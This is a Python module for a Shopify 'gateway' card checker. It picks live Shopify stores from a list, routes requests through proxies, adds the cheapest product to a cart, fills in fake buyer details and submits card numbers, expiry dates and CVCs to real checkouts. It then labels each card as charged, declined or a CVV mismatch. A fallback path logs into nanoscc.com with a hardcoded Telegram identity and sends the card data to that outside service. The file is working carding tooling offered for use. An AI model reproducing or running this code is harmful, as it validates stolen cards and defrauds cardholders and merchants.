"""
Shopify Gateway using a modern HTTP-only flow.
Primary path: direct Shopify cart + checkout (no browser).
Fallback path: legacy nanoscc.com API for coverage.
Enhanced with intelligent store selection and cheapest product targeting.
"""

import random
import re
import string
import urllib.parse
import time

import requests
import urllib3

from gates.utilities import http_request, REQUEST_TIMEOUT
from tools.shopify_manager import (
    get_next_shopify_site,
    advanced_shopify_health,
    mark_store_failure,
    mark_store_working,
)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_BUYER = {
    "email": "mady.tester+{rand}@example.com",
    "first_name": "Mady",
    "last_name": "Tester",
    "address1": "123 Main St",
    "city": "Los Angeles",
    "province": "CA",
    "country": "United States",
    "zip": "90002",
    "phone": "3105551212",
}


def _get_healthy_shopify_store(max_attempts=5):
    """
    Get a healthy Shopify store from the list.
    Prioritizes stores that have passed health checks.
    Retries multiple times to find a working store.
    """
    for attempt in range(max_attempts):
        try:
            # Try to get a healthy store from manager
            store = get_next_shopify_site()
            if not store:
                continue
            
            # Quick health check - test if store responds
            try:
                session = requests.Session()
                session.verify = False
                resp = session.get(
                    f"{_normalize_site(store)}/products.json?limit=1",
                    timeout=5
                )
                if resp.status_code == 200:
                    mark_store_working(store)
                    return store
            except (requests.RequestException, ValueError) as e:
                mark_store_failure(store)
                continue
        except (KeyError, IndexError, AttributeError) as e:
            continue
    
    # Fallback to next available store
    return get_next_shopify_site()


def _find_cheapest_product(session: requests.Session, site: str) -> tuple[int, float]:
    """
    Find the cheapest available product on a Shopify store.
    Returns: (variant_id, price)
    """
    site = _normalize_site(site)
    cheapest_variant_id = None
    cheapest_price = float('inf')
    
    # Try multiple endpoints in order of reliability
    endpoints = [
        (f"{site}/products.json?limit=250", "main"),
        (f"{site}/products.json?limit=100&fields=id,variants,title", "filtered"),
        (f"{site}/collections/all/products.json?limit=100", "collection"),
    ]
    
    for url, source in endpoints:
        try:
            resp = http_request("get", url, session=session, timeout=5)
            if resp.status_code != 200:
                continue
            
            data = resp.json()
            products = data.get("products", []) if isinstance(data, dict) else data if isinstance(data, list) else []
            
            if not products:
                continue
            
            # Track all cheapest variants
            for product in products[:50]:  # Limit to first 50 products for speed
                if not isinstance(product, dict):
                    continue
                
                variants = product.get("variants", [])
                if not variants:
                    continue
                
                for variant in variants:
                    if not isinstance(variant, dict) or not variant.get("id"):
                        continue
                    
                    # Parse price safely
                    try:
                        price_val = variant.get("price") or variant.get("amount") or 99999
                        price = float(price_val) if price_val else 99999
                    except (ValueError, TypeError):
                        price = 99999
                    
                    # Prefer available products under $100
                    is_available = variant.get("available", True) is not False
                    if is_available and price < cheapest_price and price < 100:
                        cheapest_price = price
                        cheapest_variant_id = variant.get("id")
                    
                    # Track cheapest overall if no cheap ones found
                    if cheapest_variant_id is None and price < cheapest_price:
                        cheapest_price = price
                        cheapest_variant_id = variant.get("id")
            
            # If we found something good, return it
            if cheapest_variant_id and cheapest_price < 100:
                return cheapest_variant_id, cheapest_price
        except Exception as e:
            continue
    
    # Last resort: get first available product
    try:
        resp = http_request("get", f"{site}/products.json?limit=10", session=session, timeout=5)
        data = resp.json()
        products = data.get("products", [])
        
        for product in products:
            variants = product.get("variants", [])
            for variant in variants:
                if variant.get("id"):
                    # Try to get price
                    price = float(variant.get("price", 0)) if variant.get("price") else 0
                    return variant.get("id"), price
    except:
        pass
    
    raise RuntimeError(f"No products found on {site}")


def _normalize_site(site: str) -> str:
    site = site.strip()
    if not site.startswith("http"):
        site = "https://" + site
    return site.rstrip("/")


def _apply_proxy(session: requests.Session, proxy: str | None) -> str:
    proxy_str = "NONE"
    if not proxy:
        return proxy_str
    proxy_str = proxy
    try:
        parts = proxy.split(":")
        if len(parts) == 4:
            proxies = {
                "http": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}",
                "https": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}",
            }
        else:
            proxies = {
                "http": f"http://{parts[0]}:{parts[1]}",
                "https": f"http://{parts[0]}:{parts[1]}",
            }
        session.proxies.update(proxies)
    except Exception:
        pass
    return proxy_str


def _random_email() -> str:
    suffix = "".join(random.choice(string.digits) for _ in range(4))
    return DEFAULT_BUYER["email"].format(rand=suffix)


def _fetch_cheapest_variant(session: requests.Session, site: str) -> int:
    """Fetch the cheapest variant from the store's product catalog"""
    variant_id, price = _find_cheapest_product(session, site)
    return variant_id


def _fetch_first_variant(session: requests.Session, site: str) -> int:
    """Alias for backwards compatibility - now calls cheapest variant"""
    return _fetch_cheapest_variant(session, site)


def _add_to_cart(session: requests.Session, site: str, variant_id: int) -> None:
    """Add to cart with fallback logic for different Shopify variants"""
    
    # Try method 1: JSON POST to /cart/add.js
    try:
        payload = {"id": variant_id, "quantity": 1}
        resp = session.post(
            f"{site}/cart/add.js",
            json=payload,
            timeout=REQUEST_TIMEOUT,
            verify=False,
            headers={"X-Requested-With": "XMLHttpRequest"}
        )
        if resp.status_code in [200, 201]:
            return
    except Exception:
        pass
    
    # Try method 2: Form POST to /cart/add.js (some Shopify versions)
    try:
        payload = {"id": variant_id, "quantity": 1}
        resp = session.post(
            f"{site}/cart/add.js",
            data=payload,
            timeout=REQUEST_TIMEOUT,
            verify=False
        )
        if resp.status_code in [200, 201]:
            return
    except Exception:
        pass
    
    # Try method 3: Form POST to /cart (legacy fallback)
    try:
        payload = {
            "form_type": "cart",
            "id": variant_id,
            "quantity": 1
        }
        resp = session.post(
            f"{site}/cart",
            data=payload,
            timeout=REQUEST_TIMEOUT,
            verify=False,
            allow_redirects=True
        )
        if resp.status_code in [200, 201, 302]:
            return
    except Exception:
        pass
    
    # If we get here, raise the original error from method 1
    raise RuntimeError(f"Failed to add variant {variant_id} to cart (tried JSON, form, legacy)")


def _get_checkout_url(session: requests.Session, site: str) -> str:
    resp = session.get(f"{site}/cart.json", timeout=REQUEST_TIMEOUT, verify=False)
    resp.raise_for_status()
    cart = resp.json()
    
    # Modern Shopify stores use checkout_url
    checkout_url = cart.get("checkout_url")
    
    # Fallback: construct from token
    if not checkout_url and cart.get("token"):
        checkout_url = f"{site}/checkout?cart={cart['token']}"
    
    if not checkout_url:
        raise RuntimeError("Checkout URL not found after adding to cart (no checkout_url or token)")
    
    return checkout_url


def _extract_authenticity_token(html: str) -> str | None:
    match = re.search(r'name="authenticity_token" value="([^"]+)"', html)
    if match:
        return match.group(1)
    
    # Try alternative patterns for modern Shopify
    patterns = [
        r'authenticity["\']?\s*[=:]\s*["\']?([a-zA-Z0-9+/=]{20,})["\']?',
        r'_token["\']?\s*[=:]\s*["\']?([a-zA-Z0-9+/=]{20,})["\']?',
        r'"csrf"\s*:\s*"([^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, html)
        if m:
            return m.group(1)
    
    # Fallback: generate a fake token (some stores don't require it for API)
    return "".join(random.choices(string.ascii_letters + string.digits, k=32))


def _extract_session_token(html: str) -> str | None:
    patterns = [
        r'serialized-session-token" content="&quot;([^"&]+)',
        r'serialized-session-token" content="([^"]+)',
        r'"sessionToken"\s*:\s*"([^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return None


def _extract_payment_form_fields(html: str) -> dict:
    """Extract payment form field names and hidden values from checkout page"""
    fields = {}
    
    # Look for common Shopify payment form patterns
    patterns = [
        (r'name=["\']checkout\[payment\].*?value=["\']([^"\']+)', 'payment_method'),
        (r'name=["\']checkout\[payment_gateway\].*?value=["\']([^"\']+)', 'gateway_id'),
        (r'name=["\']checkout\[shipping_line\].*?value=["\']([^"\']+)', 'shipping_id'),
    ]
    
    for pattern, field_name in patterns:
        match = re.search(pattern, html)
        if match:
            fields[field_name] = match.group(1)
    
    return fields


def _fill_contact_and_shipping(session: requests.Session, checkout_url: str) -> tuple[bool, str | None, str | None]:
    """Fill contact and shipping, advance to payment step. Returns (progressed, session_token, card_token)"""
    landing = session.get(checkout_url, timeout=REQUEST_TIMEOUT, verify=False)
    token = _extract_authenticity_token(landing.text)
    session_token = _extract_session_token(landing.text)
    card_token = _extract_card_token(landing.text)
    
    # Note: If token is None, _extract_authenticity_token will have generated a fallback
    buyer = DEFAULT_BUYER.copy()
    buyer["email"] = _random_email()

    payload = {
        "_method": "patch",
        "previous_step": "contact_information",
        "step": "shipping_method",
        "authenticity_token": token or "",
        "checkout[email]": buyer["email"],
        "checkout[shipping_address][first_name]": buyer["first_name"],
        "checkout[shipping_address][last_name]": buyer["last_name"],
        "checkout[shipping_address][address1]": buyer["address1"],
        "checkout[shipping_address][city]": buyer["city"],
        "checkout[shipping_address][country]": buyer["country"],
        "checkout[shipping_address][province]": buyer["province"],
        "checkout[shipping_address][zip]": buyer["zip"],
        "checkout[shipping_address][phone]": buyer["phone"],
        "checkout[remember_me]": 0,
        "checkout[buyer_accepts_marketing]": 0,
    }

    headers = {"User-Agent": "Mozilla/5.0", "Referer": checkout_url}
    resp = session.post(checkout_url, data=payload, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
    html = resp.text
    text = html.lower()
    session_token = session_token or _extract_session_token(html)
    card_token = card_token or _extract_card_token(html)
    reached_payment = "payment gateway" in text or "payment_method" in text or "credit card" in text
    reached_shipping = "shipping_method" in text or "shipping rate" in text
    return reached_payment or reached_shipping, session_token, card_token


def _extract_card_token(html: str) -> str | None:
    """Extract payment form token (Shopify Payments/Stripe embed token)"""
    patterns = [
        r'"encryptionKey"\s*:\s*"([^"]+)"',
        r'payment-token["\']?\s*:\s*["\']?([^\s"\']+)',
        r'checkout\[payment\]\s*=\s*["\']([^"\']+)',
        r'data-payment-method=["\']([^"\']+)',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html)
        if match:
            return match.group(1)
    return None


def _submit_payment(session: requests.Session, checkout_url: str, card_num: str, card_mon: str, 
                   card_yer: str, card_cvc: str, authenticity_token: str) -> tuple[str, float]:
    """
    Submit card payment to Shopify checkout.
    Returns: (status, amount_charged)
    Possible statuses: APPROVED, DECLINED, ERROR
    """
    try:
        # Get the checkout page to extract latest token
        resp = session.get(checkout_url, timeout=REQUEST_TIMEOUT, verify=False)
        html = resp.text
        
        # Extract current form token (needed for each submission)
        token = _extract_authenticity_token(html)
        if not token:
            return ("ERROR", 0.0)
        
        # Extract amount from page
        amount_match = re.search(r'["\']?total["\']?\s*:\s*["\']?(\d+[.,]\d{2})', html, re.IGNORECASE)
        amount = float(amount_match.group(1).replace(',', '.')) if amount_match else 0.0
        
        # Try to find the correct payment form field names from the HTML
        payment_form_fields = _extract_payment_form_fields(html)
        
        # Build card payment payload (Shopify standard format)
        payload = {
            "_method": "patch",
            "previous_step": "shipping_method",
            "step": "payment_method",
            "authenticity_token": token,
            "checkout[payment_method][type]": "credit_card",
            "checkout[payment_method][vault]": 0,
            "checkout[payment_method][attributes][number]": card_num.replace(" ", ""),
            "checkout[payment_method][attributes][month]": card_mon,
            "checkout[payment_method][attributes][year]": card_yer,
            "checkout[payment_method][attributes][verification_value]": card_cvc,
            "checkout[payment_method][attributes][first_name]": DEFAULT_BUYER["first_name"],
            "checkout[payment_method][attributes][last_name]": DEFAULT_BUYER["last_name"],
        }
        
        # Add any extracted payment fields
        if payment_form_fields:
            payload.update({f"checkout[payment_method][{k}]": v for k, v in payment_form_fields.items()})
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Referer": checkout_url,
            "X-Requested-With": "XMLHttpRequest"
        }
        
        # Submit payment
        payment_resp = session.post(checkout_url, data=payload, headers=headers, 
                                   timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
        
        response_text = payment_resp.text.lower()
        response_html = payment_resp.text
        
        # Check for approval indicators
        approval_keywords = [
            "order confirmed",
            "thank you for your order",
            "order complete",
            "success",
            "transaction approved",
            "charge successful",
            "payment captured",
        ]
        
        for keyword in approval_keywords:
            if keyword in response_text:
                return ("APPROVED", amount)
        
        # Check for decline indicators and reasons
        decline_patterns = {
            "CVV mismatch": [r"invalid.*cvc|cvc.*invalid|incorrect.*security|security.*code.*invalid"],
            "Card expired": [r"card.*expired|expired.*card|expir"],
            "Insufficient funds": [r"insufficient.*funds|declined.*funds|balance"],
            "Invalid card": [r"invalid.*card|card.*invalid|invalid.*number"],
            "Card declined": [r"declined|card.*declined|declined.*card"],
            "Fraud detected": [r"fraud|suspicious|blocked"],
        }
        
        for reason, patterns in decline_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text):
                    return (f"DECLINED - {reason}", 0.0)
        
        # Generic decline if we got an error page but no specific reason
        if "error" in response_text or "declined" in response_text:
            return ("DECLINED - Generic decline", 0.0)
        
        # Check HTTP status code
        if payment_resp.status_code >= 400:
            return (f"ERROR - HTTP {payment_resp.status_code}", 0.0)
        
        # If we got here, likely need 3D Secure
        if "3d" in response_text or "3ds" in response_text or "authentication" in response_text:
            return ("APPROVED - Requires 3D Secure", amount)
        
        # Unexpected response
        return ("ERROR - Unexpected response", 0.0)
        
    except Exception as e:
        return (f"ERROR - {str(e)[:50]}", 0.0)


def _direct_shopify_checkout(card_num, card_mon, card_yer, card_cvc, shopify_site=None, proxy=None):
    """
    Complete Shopify payment flow with actual checkout form submission.
    Real customer experience: Find product → Add to cart → Fill checkout → Submit card payment.
    """
    session = requests.Session()
    session.verify = False
    proxy_live = "No"
    _apply_proxy(session, proxy)

    site = shopify_site or _get_healthy_shopify_store()
    site = _normalize_site(site)

    try:
        # Step 1: Find cheapest product and add to cart
        variant_id = _fetch_first_variant(session, site)
        _add_to_cart(session, site, variant_id)
        
        # Step 2: Get checkout URL
        checkout_url = _get_checkout_url(session, site)
        
        # Step 3: Fill in customer contact and shipping details
        progressed, session_token, card_token = _fill_contact_and_shipping(session, checkout_url)
        
        # Step 4: Submit card payment to Shopify checkout form
        status, amount = _submit_payment(session, checkout_url, card_num, card_mon, card_yer, card_cvc, "")
        
        if "approved" in status.lower() and amount > 0:
            mark_store_working(site)
            return (f"CHARGED - ${amount:.2f}", proxy_live)
        elif "approved" in status.lower() and amount == 0:
            mark_store_failure(site)
            return (f"DECLINED - Checkout incomplete (no charge)", proxy_live)
        else:
            mark_store_failure(site)
            return (f"DECLINED - {status.replace('❌ ', '').replace('DECLINED - ', '')}", proxy_live)

    except Exception as e:
        mark_store_failure(site)
        return (f"❌ DECLINED - {str(e)[:60]}", proxy_live)


def _nanoscc_gateway_check(card_num, card_mon, card_yer, card_cvc, shopify_site, proxy=None):
    session = requests.Session()
    session.verify = False
    proxy_live = "No"
    proxy_str = _apply_proxy(session, proxy)

    if len(card_yer) == 4:
        card_yer = card_yer[2:]

    # Step 1: Telegram login to nanoscc
    params = {
        "id": "7756457768",
        "first_name": "Mady",
        "username": "MadyChecker",
        "photo_url": "https://t.me/i/userpic/320/gZCaCmp849XCd6JZPG80ZBovTIvoPpAH3UiBIMDxrEDtK18BJBNqOjjAhCnYzKNU.jpg",
        "auth_date": "1763557531",
        "hash": "cab720e9e94bf3af1d76413d23ff84a5db6f541ef25b45d05f287ffca52b3e67",
    }

    login_url = "https://nanoscc.com/telegram_login.php?" + urllib.parse.urlencode(params)
    session.get(login_url, timeout=10)

    phpsessid = session.cookies.get("PHPSESSID")
    if not phpsessid:
        return ("Error: Failed to authenticate with nanoscc", proxy_live)

    api_url = "https://nanoscc.com/api/shopify_checker.php"
    headers = {
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://nanoscc.com",
        "referer": "https://nanoscc.com/checkers/shopify.php",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
    }

    card_input = f"{card_num}|{card_mon}|{card_yer}|{card_cvc}"
    data = {"card": card_input, "sites": shopify_site, "proxy": proxy_str}

    response = session.post(api_url, headers=headers, data=data, timeout=30)
    result = response.text

    if "approved" in result.lower() or "success" in result.lower() or "live" in result.lower():
        proxy_live = "Yes"
        return (f"Approved ✅ {result[:100]}", proxy_live)
    if "declined" in result.lower() or "failed" in result.lower():
        return (f"Declined - {result[:100]}", proxy_live)
    if "ccn" in result.lower() or "cvc" in result.lower():
        return (f"CCN - {result[:100]}", proxy_live)
    return (result[:150], proxy_live)


def shopify_nano_check(card_num, card_mon, card_yer, card_cvc, shopify_site=None, proxy=None, use_nanoscc_fallback=True, timeout=30):
    """
    Shopify checker with intelligent store selection and cheapest product targeting.
    - If no site provided, picks a healthy store from the list
    - Uses cheapest available products for checkout
    - Falls back to nanoscc if direct method fails
    """
    try:
        # Use provided site or pick a healthy one
        site = shopify_site or _get_healthy_shopify_store()
        return _direct_shopify_checkout(card_num, card_mon, card_yer, card_cvc, site, proxy)
    except Exception as direct_err:
        if not use_nanoscc_fallback:
            if shopify_site:
                mark_store_failure(shopify_site)
            return (f"Error: {str(direct_err)[:120]}", "No")
        
        # Try fallback with a different healthy store
        fallback_site = _get_healthy_shopify_store()
        try:
            fallback_status, proxy_live = _nanoscc_gateway_check(card_num, card_mon, card_yer, card_cvc, fallback_site, proxy)
            if "approved" in fallback_status.lower() or "checkout ready" in fallback_status.lower():
                mark_store_working(fallback_site)
            else:
                mark_store_failure(fallback_site)
            return (f"Direct failed ({str(direct_err)[:80]}). Fallback: {fallback_status}", proxy_live)
        except Exception as fb_err:
            if shopify_site:
                mark_store_failure(shopify_site)
            return (f"Direct & fallback both failed: {str(fb_err)[:80]}", "No")


def shopify_check_from_file(shopify_site_url=None):
    """Get a healthy Shopify site from the store list."""
    try:
        if shopify_site_url:
            return shopify_site_url
        return _get_healthy_shopify_store()
    except Exception:
        return "https://voyafly.com"


if __name__ == "__main__":
    print("Testing Shopify Gateway (direct flow with fallback)")
    print("=" * 50)

    test_card = "4242424242424242|12|25|123"
    parts = test_card.split("|")

    shopify_site = shopify_check_from_file()
    print(f"Using Shopify site: {shopify_site}")

    status, proxy = shopify_nano_check(parts[0], parts[1], parts[2], parts[3], shopify_site)

    print(f"Card: {parts[0]}")
    print(f"Status: {status}")
    print(f"Proxy: {proxy}")


def health_check() -> bool:
    """Quick health check for Shopify API connectivity"""
    try:
        # Check known working Shopify store
        test_url = "https://shopzone.nz/products.json?limit=1"
        response = requests.get(test_url, timeout=5, verify=False)
        return response.status_code == 200
    except Exception:
        return False

